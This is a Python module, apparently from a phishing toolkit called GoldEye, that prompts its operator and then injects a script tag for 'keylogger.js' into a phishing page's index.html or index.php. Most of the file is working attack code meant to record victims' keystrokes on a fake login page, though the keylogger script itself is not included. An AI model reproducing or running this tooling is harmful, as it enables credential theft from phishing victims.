from Defs.ImportManager.unsorted_will_be_replaced import wait, run_command, path
import Defs.ThemeManager.theme as theme

default_palette = theme.default_palette


def add_keylogger_prompt():
    run_command('clear')
    print('''{1}
    #	    ████████                ██          ████████                 
    #	  ██░░░░░░██              ░██          ░██░░░░░   ██   ██        
    #	 ██      ░░   ██████      ░██  ██████  ░██       ░░██ ██   █████ 
    #	░██          ██░░░░██  ██████ ██░░░░   ░███████   ░░███   ██░░░██
    #	░██    █████░██   ░██ ██░░░██░░█████   ░██░░░░     ░██   ░███████
    #	░░██  ░░░░██░██   ░██░██  ░██ ░░░░░██  ░██         ██    ░██░░░░ 
    #	 ░░████████ ░░██████ ░░██████ ██████   ░████████  ██     ░░██████
    #	  ░░░░░░░░   ░░░░░░   ░░░░░░ ░░░░░░    ░░░░░░░░  ░░       ░░░░░░  
        {1}https://github.com/FakeSmileUX
        {0}** By: {1}FakeSmile {0}**'''.format(default_palette[0], default_palette[2]))
    print("-------------------------------\n{0}[ Keylogger Prompt ]{1}!! {0}\n-------------------------------".format(default_palette[0], default_palette[4]))
    print("\n{0}[{1}!{0}]{1}Attention: Adding Keylogger Mostly Kills the Tunnel Connection.\n".format(default_palette[0], default_palette[4]))
    print("\n{0}[{1}*{0}]{0}Do You Want To Ad A Keylgger In Phishing Page-{1}(Y/N)".format(default_palette[0], default_palette[4]))
    choice = input("\n\n{1}{0}Your Choice >>> {2}".format(default_palette[0], default_palette[4], default_palette[2])).upper()
    if choice == 'Y':
        add_keylogger()
    else:
        wait(1)


def add_keylogger():
    if path.exists('Server/www/index.html'):
        with open('Server/www/index.html') as f:
            read_data = f.read()
        c = read_data.replace(
            '</title>', '</title><script src="keylogger.js"></script>')
        f = open('Server/www/index.html', 'w')
        f.write(c)
        f.close()
        print("\n{0}[{1}#{0}]Keylogger{0} ADDED !!!".format(default_palette[0], default_palette[4]))
        wait(2)
    else:
        with open('Server/www/index.php') as f:
            read_data = f.read()
        c = read_data.replace(
            '</title>', '</title><script src="keylogger.js"></script>')
        f = open('Server/www/index.php', 'w')
        f.write(c)
        f.close()
        print("\n{0}[{1}#{0}]Keylogger{0} ADDED !!!".format(default_palette[0], default_palette[4]))
        wait(2)

